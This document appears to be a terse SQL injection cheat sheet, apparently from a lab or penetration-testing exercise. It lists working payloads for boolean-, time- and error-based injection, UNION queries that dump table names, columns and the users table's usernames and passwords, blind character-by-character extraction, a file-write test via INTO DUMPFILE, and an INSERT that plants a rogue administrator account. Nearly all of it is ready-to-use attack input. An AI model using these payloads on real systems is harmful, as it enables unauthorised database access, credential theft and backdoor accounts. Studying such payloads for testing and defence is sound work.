# CRUD Operations

1. Create rogue admin: `INSERT INTO users (username, password, is_admin) VALUES ('rogue_admin', MD5("RoguePass123"), TRUE);`

2. Delete rogue admin: `DELETE FROM users WHERE username = 'rogue_admin';`

# Filesystem operations

1. View the current user: `SELECT current_user;`
   
2. Check for the `secure_file_priv` setting: `SHOW VARIABLES LIKE 'secure_file_priv';`

3. Trying to create a file: `SELECT 'test123' INTO DUMPFILE '/var/lib/mysql-files/test.txt';`

# SQL Queries

1. Boolean-based: `' OR (SELECT SUBSTRING(username, 1, 1) FROM users WHERE username = 'blogpage_admin') = 'a' %23`

2. Time-based: `' OR IF(SUBSTRING((SELECT username FROM users WHERE username = 'blogpage_admin'), 1, 1) = 'b', SLEEP(1), 0) %23`

3. Error-based: `' union select null, null, null, null, null %23`

# Exploit(error-based)

1. Retrieve user: `' UNION SELECT NULL, user(), NULL, NULL, NULL %23`

2. Retrieve database name: `' UNION SELECT NULL, database(), NULL, NULL, NULL %23`

3. Retrieve tables names: `' UNION SELECT NULL, table_name, NULL, NULL, NULL from information_schema.tables %23`

4. Dumping columns from users table: ` UNION SELECT NULL, column_name, NULL, NULL, NULL from information_schema.columns where table_name = "users" %23`

5. Dumping users table: `' UNION SELECT NULL, username, password, NULL, NULL from users %23`

# Exploit(blind)

1. Extracting users with a boolean-based vulnerability: `' OR (SELECT SUBSTRING(username, 1, 1) FROM users order by id limit 0,1) = 'a' %23`

2. Extracting users with a time-based vulnerability: `' OR IF(SUBSTRING((SELECT username FROM users order by id limit 0,1), 1, 1) = 'b', SLEEP(1), 0) %23`
